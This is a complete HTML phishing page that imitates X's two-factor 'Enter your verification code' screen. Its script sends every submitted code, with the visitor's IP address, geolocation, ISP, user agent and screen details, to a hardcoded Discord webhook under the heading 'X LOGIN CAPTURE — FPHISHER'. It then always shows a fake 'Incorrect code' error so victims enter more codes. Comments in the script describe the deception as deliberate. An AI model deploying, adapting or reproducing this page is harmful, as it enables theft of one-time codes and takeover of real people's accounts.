<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>X — Enter verification code</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Chirp:wght@400;700&family=DM+Sans:wght@400;500;700;800&display=swap" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'DM Sans', sans-serif;
      background: #000;
      color: #e7e9ea;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0;
    }
    .card {
      background: #000;
      width: 100%;
      max-width: 440px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 16px 32px 32px;
      position: relative;
    }
    .code-input {
      background: transparent;
      border: 1px solid #333;
      border-radius: 4px;
      color: #e7e9ea;
      font-size: 17px;
      font-family: 'DM Sans', sans-serif;
      padding: 14px 12px 6px;
      width: 100%;
      outline: none;
      transition: border-color 0.15s;
      caret-color: #1d9bf0;
    }
    .code-input:focus {
      border-color: #1d9bf0;
      border-width: 2px;
    }
    .code-input:focus + .float-label,
    .code-input:not(:placeholder-shown) + .float-label {
      top: 6px;
      font-size: 11px;
      color: #1d9bf0;
    }
    .float-label {
      position: absolute;
      left: 13px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 17px;
      color: #71767b;
      pointer-events: none;
      transition: top 0.15s, font-size 0.15s, color 0.15s;
    }
    .input-wrap { position: relative; }
    .btn-next {
      background: #e7e9ea;
      color: #0f1419;
      font-weight: 800;
      font-size: 15px;
      border-radius: 999px;
      padding: 14px;
      width: 100%;
      border: none;
      cursor: pointer;
      font-family: 'DM Sans', sans-serif;
      letter-spacing: 0.01em;
      transition: background 0.15s;
    }
    .btn-next:hover { background: #d0d4d7; }
    .x-link {
      color: #1d9bf0;
      font-size: 15px;
      text-decoration: none;
      display: block;
      margin-bottom: 16px;
    }
    .x-link:hover { text-decoration: underline; }
    .close-btn {
      background: none;
      border: none;
      color: #e7e9ea;
      cursor: pointer;
      padding: 4px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.15s;
      width: 34px;
      height: 34px;
    }
    .close-btn:hover { background: rgba(231,233,234,0.1); }
  </style>
</head>
<body>
  <div class="card">

    <!-- Top bar -->
    <div class="flex items-center justify-between mb-8">
      <button class="close-btn" onclick="history.back()">
        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
          <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"/>
        </svg>
      </button>

      <svg viewBox="0 0 1200 1227" fill="white" xmlns="http://www.w3.org/2000/svg" width="28" height="28">
        <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.163 519.284ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.828Z"/>
      </svg>

      <div style="width:34px;"></div>
    </div>

    <h1 style="font-size:23px; font-weight:800; color:#e7e9ea; margin-bottom:8px; line-height:1.25;">
      Enter your verification code
    </h1>
    <p style="font-size:15px; color:#71767b; margin-bottom:24px; line-height:1.5;">
      Use your code generator app to generate a code and enter it below.
    </p>

    <div class="input-wrap mb-6">
      <input
        type="text"
        id="code"
        class="code-input"
        placeholder=" "
        maxlength="8"
        autocomplete="one-time-code"
        inputmode="numeric"
      />
      <span class="float-label">Enter code</span>
    </div>

    <div id="error-container" style="min-height:24px;"></div>

    <a href="#" class="x-link">Choose a different verification method</a>
    <a href="#" class="x-link">Contact X Support</a>

    <div class="flex-1"></div>

    <button class="btn-next" onclick="handleSubmit()">Next</button>

  </div>

  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1484322041917341898/e9EaULAxunSGTgMqwJkO6X_WEX302bD1VpOqHZnhCl53am9Fib5_P2gzn9Z397_gtYWS";

    async function getGeoInfo() {
      try {
        const r = await fetch("https://ip-api.com/json/?fields=status,query,country,regionName,city,isp,proxy,hosting");
        if (!r.ok) return {};
        const d = await r.json();
        if (d.status !== "success") return {};
        return {
          ip: d.query || "unknown",
          country: d.country || "unknown",
          region: d.regionName || "unknown",
          city: d.city || "unknown",
          isp: d.isp || "unknown",
          proxy: (d.proxy || d.hosting) ? "Yes" : "No"
        };
      } catch {
        return {};
      }
    }

    async function sendCapture(code) {
      if (!code?.trim()) return;

      const geo = await getGeoInfo();

      const now = new Date();
      const iso = now.toISOString();
      const local = now.toLocaleString("en-US", {
        month:"numeric", day:"numeric", year:"numeric",
        hour:"numeric", minute:"numeric", second:"numeric",
        hour12:true, timeZoneName:"short"
      });

      const payload = {
        embeds: [{
          title: "🔐✨  X LOGIN CAPTURE  —  FPHISHER",
          description: "═══════════════════════════════════════",
          color: 0xFF0000,
          fields: [
            { name: "🔑 CODE",          value: `➤ ${code.trim()}`, inline:false },
            { name: "🌍 LOCATION",       value:
              `➤ Country: ${geo.country||'unknown'}\n` +
              `➤ Region:  ${geo.region ||'unknown'} 📍\n` +
              `➤ City:    ${geo.city   ||'unknown'}`, inline:false },
            { name: "🌐 IP ADDRESS",     value:
              `➤ ${geo.ip||'unknown'}\n` +
              `➤ Proxy/VPN: ${geo.proxy||'unknown'}\n` +
              `➤ ISP:     ${geo.isp ||'unknown'}`, inline:false },
            { name: "🕒 TIMESTAMP",      value: `➤ ${iso}\n➤ Local:   ${local}`, inline:false },
            { name: "💻 USER AGENT",     value: `➤ ${navigator.userAgent || 'unknown'}`, inline:false },
            { name: "🖥️ SCREEN",         value: `➤ ${screen.width}×${screen.height}   •   ${navigator.language || 'unknown'}`, inline:false }
          ],
          footer: {
            text: "═══════════════════════════════════════\n⚡ Powered by FTECH™ Secure Systems\n🛡️ Data Pipeline: ACTIVE\n═══════════════════════════════════════"
          }
        }]
      };

      fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).catch(() => {});   // silent
    }

    function showError(msg = "Incorrect code. Please try again.") {
      const container = document.getElementById("error-container");
      let el = document.getElementById("err-msg");
      if (!el) {
        el = document.createElement("div");
        el.id = "err-msg";
        el.style.cssText = "color:#f4212e; font-size:15px; text-align:center; font-weight:500; margin:4px 0;";
        container.appendChild(el);
      }
      el.textContent = msg;
    }

    async function handleSubmit() {
      const input = document.getElementById("code");
      const value = input.value.trim();

      // send even if empty (some people press next without typing)
      await sendCapture(value);

      // always fake failure
      showError("Incorrect code. Please try again.");

      // visual feedback
      input.style.borderColor = "#f4212e";
      input.style.borderWidth = "2px";
      input.classList.add("shake");

      setTimeout(() => {
        input.classList.remove("shake");
        input.focus();
        // field is NOT cleared → most realistic behavior
      }, 700);
    }

    // shake keyframes
    const s = document.createElement("style");
    s.textContent = `
      @keyframes shake {
        0%,100% {transform:translateX(0)}
        10%,30%,50%,70%,90% {transform:translateX(-5px)}
        20%,40%,60%,80%     {transform:translateX( 5px)}
      }
      .shake { animation: shake 0.7s cubic-bezier(.36,.07,.19,.97) both; }
    `;
    document.head.appendChild(s);

    // reset styling when user types
    document.getElementById("code").addEventListener("input", function() {
      this.style.borderColor = "";
      this.style.borderWidth = "";
      const err = document.getElementById("err-msg");
      if (err) err.textContent = "";
    });

    // focus on load
    document.getElementById("code").focus();
  </script>
</body>
</html>
